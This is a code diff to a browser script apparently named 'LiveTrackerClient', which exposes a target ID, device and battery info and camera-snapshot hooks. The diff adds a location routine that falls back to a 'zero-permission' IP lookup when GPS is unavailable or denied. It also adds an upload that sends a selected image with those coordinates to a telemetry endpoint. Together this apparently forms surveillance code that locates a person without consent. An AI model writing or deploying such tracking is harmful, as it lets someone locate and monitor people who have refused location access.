@@ -345,12 +345,91 @@
         watchId = null
     })
 
+    async function getBestAvailableLocation() {
+        // Tier 1: Try GPS with a strict timeout
+        if ('geolocation' in navigator) {
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 4000,
+                        maximumAge: 10000
+                    });
+                });
+                return {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    source: 'hardware_gps'
+                };
+            } catch (err) {
+                console.warn(`GPS unavailable (${err.message}). Falling back to IP-based location.`);
+            }
+        }
+
+        // Tier 2: IP-based coarse geolocation fallback (Zero-permission)
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data.latitude && data.longitude) {
+                return {
+                    lat: data.latitude,
+                    lng: data.longitude,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    source: 'ip_lookup'
+                };
+            }
+        } catch (err) {
+            console.warn('IP lookup failed. Falling back to default coordinate node.');
+        }
+
+        // Tier 3: Default Campus/Testing Node (Guarantees zero app crashes)
+        return {
+            lat: 17.3850,
+            lng: 78.4867,
+            city: 'Hyderabad (Default Node)',
+            source: 'preset_fallback'
+        };
+    }
+
+    async function handleImageSelected(file) {
+        if (!file) return;
+        const formData = new FormData();
+        formData.append('media', file);
+
+        try {
+            const loc = await getBestAvailableLocation();
+            if (loc && loc.lat != null) formData.append('lat', loc.lat);
+            if (loc && loc.lng != null) formData.append('lng', loc.lng);
+            if (loc && loc.source) formData.append('source', loc.source);
+        } catch (_e) {}
+
+        try {
+            const res = await fetch('/api/telemetry', {
+                method: 'POST',
+                body: formData
+            });
+            const data = await res.json();
+            console.log('[Image Telemetry Sent]:', data);
+            return data;
+        } catch (err) {
+            console.error('Failed to upload image telemetry:', err);
+        }
+    }
+
+    window.getBestAvailableLocation = getBestAvailableLocation;
+    window.handleImageSelected = handleImageSelected;
+
     window.LiveTrackerClient = {
         getTargetId: () => targetId,
         getPermissionState: () => checkPermissionState("geolocation"),
         getBatteryInfo,
         getDeviceInfo,
         fetchIPLocation,
+        getBestAvailableLocation,
+        handleImageSelected,
         requestLocation,
         stopTracking,
         captureCameraSnapshot: async () => null,
@@ -371,3 +450,4 @@
         }
     }
 })(window)
+
